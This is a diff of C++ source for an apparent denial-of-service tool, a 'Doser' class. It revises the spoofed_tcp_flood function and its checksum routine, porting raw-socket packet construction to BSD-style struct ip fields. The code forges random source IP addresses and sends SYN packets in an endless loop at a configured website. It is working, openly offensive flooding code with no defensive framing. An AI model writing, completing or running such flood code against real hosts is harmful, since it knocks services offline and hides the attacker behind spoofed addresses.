@@ -453,20 +453,12 @@ const char *Doser::randomizeIP() {
 void Doser::spoofed_tcp_flood(const int *id) {
     int s, on = 1, x;
     std::string message{};
-    char buf[4096];
-    auto *ip = (struct iphdr *)buf;
+    char buf[8192];
+    auto *ip = (struct ip *)buf;
     auto *tcp = (struct tcphdr *)(ip + 1);
     struct hostent *hp;
     struct sockaddr_in dst{};
     auto s_port = randomInt(0, 65535);
-    struct pseudo_header{
-        unsigned int source_address;
-        unsigned int dest_address;
-        unsigned char placeholder;
-        unsigned char protocol;
-        unsigned short tcp_length;
-        struct tcphdr tcp;
-    };
     while (true){
         for(x = 0; x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
@@ -481,30 +473,30 @@ void Doser::spoofed_tcp_flood(const int *id) {
             }
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
-                if((ip->daddr = inet_addr(conf->website.c_str())) < 0){
+                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
                     logger->Log("Can't resolve the host", Logger::Error);
                     exit(EXIT_FAILURE);
                 }
             }else{
-                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
+                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->saddr = inet_addr(randomizeIP())) < 0){
+            if((ip->ip_src.s_addr = inet_addr(randomizeIP())) < 0){
                 logger->Log("Unable to set random src ip", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
             // IP Struct
-            ip->ihl = 5;
-            ip->version = 4;
-            ip->tos = 16;
-            ip->tot_len = htons(sizeof(buf));
-            ip->id = static_cast<u_short>(randomInt(1, 1000));
-            ip->frag_off = htons(0x0);
-            ip->ttl = 64;
-            ip->protocol = 6;
-            ip->check = 0;
+            ip->ip_hl = 5;
+            ip->ip_v = 4;
+            ip->ip_tos = 16;
+            ip->ip_len = htons(sizeof(buf));
+            ip->ip_id = static_cast<u_short>(randomInt(1, 1000));
+            ip->ip_off = htons(0x0);
+            ip->ip_ttl = 64;
+            ip->ip_p = 6;
+            ip->ip_sum = 0;
 
-            dst.sin_addr.s_addr = ip->daddr;
+            dst.sin_addr = ip->ip_dst;
             dst.sin_family = AF_UNSPEC;
 
             // TCP Struct
@@ -514,35 +506,18 @@ void Doser::spoofed_tcp_flood(const int *id) {
             tcp->ack = 0;
             tcp->doff = 5;
             tcp->syn = 1;
-            tcp->res1 = 0;
-            tcp->urg = 0;
-            tcp->psh = 0;
-            tcp->rst = 0;
-            tcp->fin = 0;
             tcp->ack_seq = 0;
             tcp->window = htons(32767);
             tcp->check = 0;
             tcp->urg_ptr = 0;
-            tcp->check = 0;
 
-            struct pseudo_header psh{};
-            psh.source_address = ip->saddr;
-            psh.dest_address = ip->daddr;
-            psh.placeholder = 0;
-            psh.protocol = IPPROTO_TCP;
-            psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(buf));
-
-            bcopy(tcp, &psh, sizeof(struct tcphdr));
-
-            ip->check = checksum((unsigned short*) &psh , sizeof (struct pseudo_header));
-            tcp->check = ip->check;
-
+            ip->ip_sum = checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcphdr)));
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if(sendto(s, buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
+            if(sendto(s, buf, ip->ip_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
                 logger->Log("sendto() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
@@ -552,7 +527,6 @@ void Doser::spoofed_tcp_flood(const int *id) {
         logger->Log(&message, Logger::Info);
         usleep(30000);
     }
-
 }
 
 void Doser::spoofed_udp_flood(const int *id) {
@@ -628,23 +602,12 @@ void Doser::spoofed_udp_flood(const int *id) {
 }
 
 unsigned short Doser::checksum(unsigned short *buf, int len){
-    long sum;
-    unsigned short oddbyte;
-    short csum;
-    sum=0;
-    while(len>1) {
-        sum+=*buf++;
-        len-=2;
+    unsigned long sum;
+    for(sum=0; len>0; len--){
+        sum += *buf++;
     }
-    if(len==1) {
-        oddbyte=0;
-        *((u_char*)&oddbyte)=*(u_char*)buf;
-        sum+=oddbyte;
-    }
-    sum = (sum>>16)+(sum & 0xffff);
-    sum = sum + (sum>>16);
-    csum=(short)~sum;
-
-    return static_cast<unsigned short>(csum);
+    sum = (sum >> 16) + (sum &0xffff);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
 
 }
